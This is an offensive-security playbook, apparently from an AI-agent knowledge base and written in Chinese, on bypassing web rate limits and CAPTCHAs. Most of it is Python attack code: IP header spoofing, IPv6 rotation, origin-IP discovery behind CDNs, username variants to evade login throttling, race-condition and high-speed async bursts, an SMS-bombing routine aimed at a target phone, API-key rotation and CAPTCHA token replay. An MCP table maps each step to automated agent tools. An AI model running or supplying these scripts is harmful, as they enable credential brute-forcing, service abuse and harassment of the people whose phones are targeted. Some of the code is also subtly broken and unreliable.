# 速率限制绕过 — IP 轮换、Header 操纵与应用层绕过

## 场景

速率限制（Rate Limiting）是网络应用最常见的反自动化防御。高水平的绕过不在于消除限制，而在于理解限制的实现层级：IP 粒度、用户粒度、会话粒度、还是全局计数器。每种实现都有不同的绕过路径。本文件覆盖从基础设施层到应用层的完整绕过方法论。

## 输入信号

- 登录/注册/API 端点返回 `429 Too Many Requests` 或 `X-RateLimit-Remaining: 0`
- 响应头中包含限流信息（`X-RateLimit-*`、`Retry-After`、`X-Rate-Limit`）
- 错误信息提示 "Too many attempts, try again in X seconds"
- 验证码/滑动验证在 N 次失败后出现
- 验证码逻辑在客户端执行或可被重放
- API 文档中描述了 rate limit 策略但未说明 bypass 保护
- 不同 API 端点限流策略不一致（登录严格，注册宽松，或反之）
- 使用 CDN/反向代理（Cloudflare、Akamai、Fastly 等）但有旁路 IP 可达

## 核心方法论

### 1. IP 级绕过

#### 1.1 Headers 注入

IP 地址来源的优先级决定哪些 header 可以绕过限流。如果后端从 `X-Forwarded-For` 取 IP，配置错误时任意 header 值都被信任：

```python
# ip_header_bypass.py — IP Header 轮换绕过

import requests

IP_BYPASS_HEADERS = [
    # === 标准代理头 ===
    {"X-Forwarded-For": "{ip}"},
    {"X-Forwarded-For": "{ip}, 10.0.0.1"},        # 链式代理
    {"X-Forwarded-For": "{ip}, 127.0.0.1"},

    # === 非标准代理头 ===
    {"X-Real-IP": "{ip}"},
    {"X-Originating-IP": "{ip}"},
    {"X-Remote-IP": "{ip}"},
    {"X-Remote-Addr": "{ip}"},
    {"X-Client-IP": "{ip}"},
    {"X-Host": "{ip}"},
    {"X-ProxyUser-IP": "{ip}"},

    # === 云服务头 ===
    {"CF-Connecting-IP": "{ip}"},       # Cloudflare
    {"True-Client-IP": "{ip}"},          # Akamai / Cloudflare
    {"X-Akamai-Edge-Ok": "{ip}"},

    # === AWS 负载均衡器头 ===
    {"X-Forwarded-For": "{ip}"},
    {"X-Forwarded-Proto": "https"},

    # === 注入多个值混淆 ===
    {"X-Forwarded-For": "{ip}, 192.168.1.1, 10.0.0.1, 127.0.0.1"},
    {"X-Real-IP": "{ip}", "X-Forwarded-For": "{ip}"},

    # === 公司内网头 (某些系统跳过内网限流) ===
    {"X-Forwarded-For": "10.{ip}"},       # 10.0.0.0/8 内网
    {"X-Forwarded-For": "172.16.{ip}"},   # 172.16.0.0/12
    {"X-Forwarded-For": "192.168.{ip}"},  # 192.168.0.0/16
    {"X-Internal-Request": "true"},
    {"X-Is-Internal": "true"},
]
```

#### 1.2 IPv6 /64 子网轮换

IPv6 /64 子网包含 2^64 个地址。如果限流按 /64 或更粗粒度，则无法通过 IPv6 轮换绕过。但如果按 /128（单个 IP）粒度，每个服务器/容器都能发出大量请求：

```python
# ipv6_rotation.py — IPv6 地址轮换

import socket, struct, random
import concurrent.futures
import requests

class IPv6Rotator:
    """
    IPv6 轮换绕过速率限制
    使用 /64 前缀的后 64 位做随机化
    原理: 单个 IPv6 /64 子网可包含 2^64 个地址
    如果限流按 /128 粒度，每个请求用不同 IP
    """

    def __init__(self, prefix_64: str):
        """
        prefix_64: "2001:db8:1234:5678" (前 64 位)
        """
        self.prefix = prefix_64

    def random_ipv6(self) -> str:
        """生成 /64 子网内的随机 IPv6 地址"""
        # 前 64 位固定
        # 后 64 位随机
        suffix = random.randint(0, 2**64 - 1)
        addr = f"{self.prefix}:{suffix:016x}"
        # 压缩格式 (简化)
        return addr

    def sequential_ipv6(self, index: int) -> str:
        """生成序号 IPv6 地址"""
        return f"{self.prefix}:{index:016x}"

    def request_with_ipv6(self, url: str, method="POST", **kwargs) -> requests.Response:
        """使用特定 IPv6 地址发起请求"""
        # 创建绑定到指定 IP 的 socket
        src_addr = self.random_ipv6()
        # 注意: 实际使用需要本地 IPv6 支持
        # 以下为概念代码，生产环境需配置本地 IPv6 地址
        session = requests.Session()
        # 如果系统支持 IPv6 源地址绑定:
        # session.mount("https://", IPv6Adapter(source_address=src_addr))
        return session.request(method, url, **kwargs)

    @staticmethod
    def find_ipv6_prefix() -> str:
        """探测本机 IPv6 前缀以确定可用的源地址范围"""
        # 获取本机 IPv6 地址
        try:
            # 简单方案: 暴露的 IPv6 地址的前 64 位
            hostname = socket.gethostname()
            addrs = socket.getaddrinfo(hostname, None, socket.AF_INET6)
            for addr in addrs:
                ip = addr[4][0]
                # 提取前 64 位
                parts = ip.split(':')
                prefix = ':'.join(parts[:4])
                return prefix
        except:
            return None
```

#### 1.3 真实 CDN 绕过案例

```python
# cdn_bypass.py — CDN 绕过找到真实源 IP

def find_origin_ip(target_domain: str) -> list:
    """
    绕过 CDN 找到源站 IP
    源站 IP 通常没有限流或限流策略不同
    """
    import dns.resolver
    import shodan  # 可选

    methods = []

    # 1. DNS 历史记录 (SecurityTrails, Censys)
    # 2. 子域名枚举 (不同的子域名可能不经过 CDN)
    # 3. SSL 证书透明度日志
    # 4. 邮件服务器 MX 记录
    # 5. Shodan/Censys 搜索: http.title:"target"
    # 6. 应用自身功能: 图片 URL, 文件上传, API 返回的域名

    # 示例: 通过 MX 记录找真实域名
    try:
        answers = dns.resolver.resolve(target_domain, 'MX')
        for mx in answers:
            mx_str = str(mx.exchange)
            # 解析 MX 的 A 记录
            a_records = dns.resolver.resolve(mx_str, 'A')
            for a in a_records:
                methods.append(("MX_record", str(a)))
    except:
        pass

    # 示例: 通过子域名枚举
    common_subdomains = [
        "direct", "origin", "api", "cdn", "static",
        "mail", "webmail", "admin", "dev", "staging",
        "direct-lb", "origin-lb", "edge-not-enabled",
    ]
    for sub in common_subdomains:
        potential = f"{sub}.{target_domain}"
        try:
            answers = dns.resolver.resolve(potential, 'A')
            for a in answers:
                methods.append(("subdomain", str(a), potential))
        except:
            continue

    return methods
```

### 2. 应用层绕过

#### 2.1 参数轮换

很多限流基于请求参数组合的哈希。简单改变一个参数即可重置计数器：

```python
# param_rotation.py — 参数轮换绕过程序化

def login_with_param_rotation(base_url, username_base, password):
    """
    登录限流绕过: 每次请求改变 username 但指向同一账户
    原理: 后端限流 key = "login:" + MD5(username)
    如果 username 变化(key 变化), 限流重置

    方法:
    1. username + random padding: "admin%00", "admin "
    2. Unicode 等价: "admin" "admìn" (normalized)
    3. username + {" " * i}
    4. email 大小写: "Admin@test.com", "admin@Test.com"
    5. URL 编码不同表示: "admin" vs "%61dmin"
    """
    rotation_methods = [
        lambda u: u,                          # 原始
        lambda u: u + " ",                    # 尾部空格
        lambda u: u.upper(),                  # 全大写
        lambda u: u.capitalize(),             # 首字母大写
        lambda u: u + "\x00",                 # null 字节
        lambda u: u.replace('a', 'а'),   # 西里尔字母 'а' (注意: 视觉相同)
        lambda u: u + f"?t={random.randint(1,9999)}",
    ]

    for i in range(100):
        method = rotation_methods[i % len(rotation_methods)]
        rotated_name = method(username_base)
        # 如果后端 normailize 后相同 → 同用户
        # 如果后端用 raw string 作为 key → 不同用户
        r = requests.post(f"{base_url}/api/login", json={
            "username": rotated_name,
            "password": password,
        })
        print(f"Request {i}: username={repr(rotated_name)[:30]:30s} → {r.status_code}")
        if r.status_code == 200:
            print(f"  [!] Bypass! Response: {r.text[:100]}")
            break
```

#### 2.2 密码 + 后缀攻击

当限流基于 `(username, password)` 元组时，相同用户名+不同密码被视为不同请求：

```python
# password_suffix_bypass.py — 密码后缀绕过

def password_suffix_rate_limit_bypass(base_url, username):
    """
    场景: 限流 key = hash(ip + username)
    但后端先检查密码正确性再更新计数器
    使用 password + suffix 方式: 每次密码不同但最终正确

    原理:
    如果登录限流在密码验证之后计数 (错误的常见实现):
    - 请求 1: username=admin, password=pass1 → 错误, count=1
    - 请求 2: username=admin, password=pass2 → 错误, count=2
    - ...
    - 请求 N: username=admin, password=password → 正确!
    
    绕过方式: 用 password+1, password+2, ..., 最后 password (正确值)
    如果限流 key 包含 password, 每个 password 都不同, 计数器独立
    """
    correct_password = "password123"  # 正确的密码
    
    # 方法 1: 插入中间失败的请求
    for i in range(5):
        r = requests.post(f"{base_url}/api/login", json={
            "username": username,
            "password": f"{correct_password}{i}",  # wrong
        })
    
    # 最后发送正确的
    r = requests.post(f"{base_url}/api/login", json={
        "username": username,
        "password": correct_password,
    })
    return r.status_code
```

#### 2.3 并发竞态绕过

如果限流计数器不是原子的（例如：读取当前计数→检查阈值→递增），并发请求可同时通过：

```python
# rate_limit_race.py — 限流竞态绕过

import concurrent.futures, threading, time, requests

class RateLimitRaceBypass:
    """
    利用竞态条件绕过速率限制
    原理: 如果限流实现是 "读→判断→写" 非原子操作
    N 个并发请求可能同时通过检查
    """

    def __init__(self, base_url, endpoint, payload_template):
        self.base = base_url
        self.endpoint = endpoint
        self.payload_template = payload_template

    def race_bypass(self, n_requests=30, n_workers=15) -> list:
        """并发请求绕过限流"""
        successes = []
        lock = threading.Lock()
        barrier = threading.Barrier(n_workers)

        def worker(worker_id: int):
            s = requests.Session()
            try:
                barrier.wait(timeout=5)  # 同步释放
            except:
                pass
            r = s.post(f"{self.base}{self.endpoint}",
                      json=self.payload_template, timeout=15)
            with lock:
                if r.status_code == 200:
                    successes.append(worker_id)

        with concurrent.futures.ThreadPoolExecutor(max_workers=n_workers) as ex:
            futs = [ex.submit(worker, i) for i in range(n_requests)]
            concurrent.futures.wait(futs)

        return successes
```

#### 2.4 Async I/O 高效绕过

```python
# async_rate_limit_bypass.py — 异步高效绕过

import asyncio, aiohttp, time

class AsyncRateLimitBypass:
    """
    使用 asyncio + aiohttp 高速绕过限流
    单线程异步 I/O 可以最大化连接复用
    """

    def __init__(self, base_url, max_concurrent=100):
        self.base = base_url
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def request(self, session, payload, headers=None) -> dict:
        async with self.semaphore:
            async with session.post(self.base, json=payload,
                                   headers=headers, timeout=aiohttp.ClientTimeout(15)) as r:
                return {
                    "status": r.status,
                    "text": await r.text(),
                    "headers": dict(r.headers),
                }

    async def rotate_headers_burst(self, payloads: list, n_rotations: int):
        """
        异步 IP header 轮换 + 批量请求
        每秒可发送数千个请求
        """
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i in range(n_rotations):
                headers = {"X-Forwarded-For": f"{i}.{i}.{i}.{i}"}
                payload = payloads[i % len(payloads)]
                tasks.append(self.request(session, payload, headers))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            successes = [r for r in results if isinstance(r, dict) and r["status"] == 200]
            return successes
```

### 3. 真实攻击链案例

#### 3.1 短信/邮箱轰炸绕过

```python
# sms_bomb_bypass.py — 短信轰炸绕过

def sms_bomb_bypass(target_phone, base_url):
    """
    短信/邮箱验证码轰炸绕过完整套件
    """
    attack_matrix = [
        # 1. 参数轮换
        {"phone": target_phone, "country_code": "86"},
        {"phone": target_phone, "country_code": "+86"},
        {"phone": target_phone, "area_code": "086"},
        {"phone": target_phone.replace("+86", "")},

        # 2. 不同端点
        ("GET", f"/api/send-code?phone={target_phone}"),
        ("POST", "/api/send_code", {"mobile": target_phone}),
        ("POST", "/api/sendSms", {"phoneNumbers": target_phone}),
        ("POST", "/api/verification/send", {"target": target_phone}),

        # 3. 不同 Content-Type
        # application/json vs form-urlencoded vs multipart

        # 4. 重复使用同一验证码在不同端点
        # /api/send-code → /api/send-code-v2 → /api/resend-code
    ]

    for method, *rest in attack_matrix:
        if method == "POST":
            path, data = rest
            r = requests.post(f"{base_url}{path}", json=data)
        else:
            path = rest[0]
            r = requests.get(f"{base_url}{path}")
        print(f"{method} {path} → {r.status_code}")
```

#### 3.2 API Key 轮换绕过

如果系统使用 API key 做身份验证和限流，多 key 轮转可以绕过：

```python
# api_key_rotation.py — API Key 轮换

def api_key_rotation_bypass(base_url, api_keys: list, endpoint: str):
    """
    多 API key 轮换绕过频率限制
    场景: 每个 key 有 1000 req/h 限制
    如果有 10 个 key → 10000 req/h
    """
    for i in range(10000):
        key = api_keys[i % len(api_keys)]
        r = requests.get(f"{base_url}{endpoint}",
                        headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            # 处理响应
            pass
        else:
            print(f"Key {key[:16]}... exhausted at request {i}")
```

### 4. 验证码绕过

```python
# captcha_bypass.py — 验证码绕过技术

"""
常见验证码绕过:
1. 复用同一验证码 token (不验证一次有效性)
2. 验证逻辑在客户端 JS (逆向 JS 找到验证函数)
3. 滑动验证码轨迹模拟 (OpenCV + 贝塞尔曲线)
4. OCR 识别 (Tesseract / 深度学习)
5. 验证码结果在响应中返回 (img 的 data-url 包含答案)
6. 修改验证码的返回值 (响应篡改)
7. 切换 API 端点 (一个端点要验证码,另一个不需要)
8. 图形验证码降级为算术验证码 (更易自动化)
"""

def captcha_token_reuse(endpoint_with_captcha: str, session, payload):
    """
    验证码 Token 重放
    如果 token 不标记已使用，可重复使用
    """
    # Step 1: 获取验证码和 token
    r = session.get(f"{endpoint_with_captcha}/captcha")
    captcha_token = r.json().get("token")
    captcha_answer = r.json().get("answer")  # 有时答案直接返回!

    # Step 2: 用同一个 token 多次请求
    for i in range(10):
        payload_with_captcha = {**payload, "captcha_token": captcha_token,
                                 "captcha_answer": captcha_answer}
        r = session.post(endpoint_with_captcha, json=payload_with_captcha)
        print(f"Request {i}: {r.status_code}")

    # Step 3: 如果验证码逻辑在客户端:
    # 逆向 JS 找到 checkCaptcha() 函数
    # 直接调用验证通过的函数
```

## 攻击链

```
Phase 1 — 限流策略发现
  ├── 渐进式请求 (1→2→4→8...) 确定限流阈值
  ├── 观察 429 响应头和 Retry-After 值
  ├── 确认限流粒度: IP / User / Session / 全局
  └── 测试不同端点限流是否独立

Phase 2 — IP 层绕过
  ├── X-Forwarded-For / X-Real-IP 注入测试
  ├── IPv6 /64 子网轮换 (如果有 IPv6 能力)
  ├── CDN 绕过 → 源站 IP 直接访问
  └── 代理列表轮换 (SOCKS5/HTTP proxy pool)

Phase 3 — 应用层绕过
  ├── 参数轮换 (用户名 padding, 密码后缀)
  ├── API key 轮换
  ├── 并发竞态绕过
  ├── 不同 API 端点切换
  └── Content-Type/token 切换

Phase 4 — 验证码绕过
  ├── Token 重放 / 答案泄露
  ├── OCR / 轨迹模拟
  └── 逻辑降级
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测限流策略 | `http_probe` | 渐进式请求测试限流阈值和粒度 |
| 按信号查知识库 | `kb_router` | 搜索 rate limit bypass / IP rotation 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 运行批量测试 | `run_ctf_tool` | 自定义异步轮换脚本进行高速绕过 |

## 参考资料

- OWASP: Rate Limiting Vulnerability Cheat Sheet
- PortSwigger Research: "New IP Rotate bypass technique using X-Forwarded-For"
- Cloudflare: "Best practices for rate limiting — what NOT to do"
- SANS: "Bypassing Web Application Rate Limits"
- CVE-2024-23917: TeamCity Rate Limit Bypass via IP Header Injection
